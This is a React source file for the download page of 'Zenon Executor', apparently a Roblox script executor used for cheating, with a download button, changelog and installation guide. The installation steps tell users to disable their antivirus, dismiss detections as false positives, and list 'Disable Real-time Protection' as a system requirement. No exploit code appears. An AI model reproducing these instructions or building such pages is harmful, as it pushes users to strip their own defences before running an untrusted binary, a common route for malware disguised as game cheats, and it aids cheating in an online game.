import { motion } from "framer-motion";
import { Download as DownloadIcon, Terminal, Calendar, ArrowRight, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { useLatestRelease, useTrackDownload } from "@/hooks/use-releases";
import { useToast } from "@/hooks/use-toast";

export default function Download() {
  const { data: latest, isLoading } = useLatestRelease();
  const { mutate: trackDownload, isPending } = useTrackDownload();
  const { toast } = useToast();

  const handleDownload = () => {
    // Open download URL
    window.open("/downloads/Zenon_Executor.zip", "_blank");
    
    // Track download in backend if we have a release
    if (latest) {
      trackDownload(latest.id, {
        onSuccess: () => {
          toast({
            title: "Download Started",
            description: "Thank you for downloading Zenon Executor!",
          });
        },
      });
    } else {
      toast({
        title: "Download Started",
        description: "Thank you for downloading Zenon Executor!",
      });
    }
  };

  const steps = [
    { title: "Download", description: "Get the latest installer from below." },
    { title: "Disable Antivirus", description: "False positives are common with executors." },
    { title: "Install", description: "Run the installer and follow instructions." },
    { title: "Execute", description: "Launch Zenon and attach to Roblox." },
  ];

  return (
    <div className="min-h-screen bg-background pt-24 pb-12">
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="text-center mb-12"
        >
          <h1 className="text-4xl md:text-5xl font-display font-bold mb-4">
            Download <span className="text-primary">Zenon</span>
          </h1>
          <p className="text-muted-foreground text-lg">
            Get the latest version and start dominating today.
          </p>
        </motion.div>

        {/* Download Card */}
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ delay: 0.2 }}
        >
          <Card className="p-8 bg-card/50 backdrop-blur-md border-primary/20 shadow-[0_0_50px_-12px_hsl(var(--primary)/0.2)]">
            <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
              <div>
                <div className="flex items-center gap-3 mb-2">
                  <h2 className="text-2xl font-bold font-display">Zenon v1.0.1</h2>
                  {latest?.isLatest && (
                    <span className="px-2 py-0.5 rounded text-xs font-bold bg-accent/20 text-accent border border-accent/20">
                      LATEST
                    </span>
                  )}
                </div>
                <div className="flex items-center gap-4 text-sm text-muted-foreground">
                  <span className="flex items-center gap-1">
                    <Calendar className="w-4 h-4" />
                    Updated today
                  </span>
                  <span className="flex items-center gap-1">
                    <DownloadIcon className="w-4 h-4" />
                    {(latest?.downloadCount || 0).toLocaleString()} Downloads
                  </span>
                </div>
              </div>

              <Button
                size="lg"
                onClick={handleDownload}
                disabled={isPending}
                className="w-full md:w-auto text-lg h-14 px-8 bg-primary hover:bg-primary/90 shadow-[0_0_20px_rgba(147,51,234,0.3)] hover:shadow-[0_0_30px_rgba(147,51,234,0.5)] transition-all"
              >
                {isPending ? "Starting..." : "Download Installer"}
                <DownloadIcon className="w-5 h-5 ml-2" />
              </Button>
            </div>

            <div className="mt-8 pt-8 border-t border-white/5">
              <h3 className="text-lg font-semibold mb-4 flex items-center gap-2">
                <Terminal className="w-5 h-5 text-primary" />
                Changelog
              </h3>
              <div className="bg-background/50 rounded-lg p-4 font-mono text-sm text-muted-foreground">
                <pre className="whitespace-pre-wrap font-mono">Updated to support the latest Roblox version.</pre>
              </div>
            </div>
          </Card>
        </motion.div>

        {/* Installation Steps */}
        <div className="mt-20">
          <h2 className="text-2xl font-bold font-display text-center mb-10">Installation Guide</h2>
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            {steps.map((step, i) => (
              <div key={i} className="relative group">
                <div className="p-6 rounded-xl bg-secondary/20 border border-white/5 hover:border-primary/50 transition-colors h-full">
                  <div className="w-8 h-8 rounded-full bg-primary/20 text-primary flex items-center justify-center font-bold mb-4 group-hover:bg-primary group-hover:text-white transition-colors">
                    {i + 1}
                  </div>
                  <h3 className="font-bold mb-2">{step.title}</h3>
                  <p className="text-sm text-muted-foreground">{step.description}</p>
                </div>
                {i < steps.length - 1 && (
                  <div className="hidden md:block absolute top-1/2 -right-2 transform -translate-y-1/2 z-10 text-muted-foreground/30">
                    <ArrowRight className="w-6 h-6" />
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>

        {/* Requirements */}
        <div className="mt-20 p-6 rounded-xl bg-secondary/20 border border-white/5">
          <h3 className="text-lg font-bold mb-4">System Requirements</h3>
          <ul className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <li className="flex items-center gap-3 text-sm text-muted-foreground">
              <CheckCircle2 className="w-5 h-5 text-green-500" />
              Windows 10/11 (64-bit)
            </li>
            <li className="flex items-center gap-3 text-sm text-muted-foreground">
              <CheckCircle2 className="w-5 h-5 text-green-500" />
              .NET Framework 4.8+
            </li>
            <li className="flex items-center gap-3 text-sm text-muted-foreground">
              <CheckCircle2 className="w-5 h-5 text-green-500" />
              Visual C++ Redistributable
            </li>
            <li className="flex items-center gap-3 text-sm text-muted-foreground">
              <CheckCircle2 className="w-5 h-5 text-green-500" />
              Disable Real-time Protection
            </li>
          </ul>
        </div>
      </div>
    </div>
  );
}
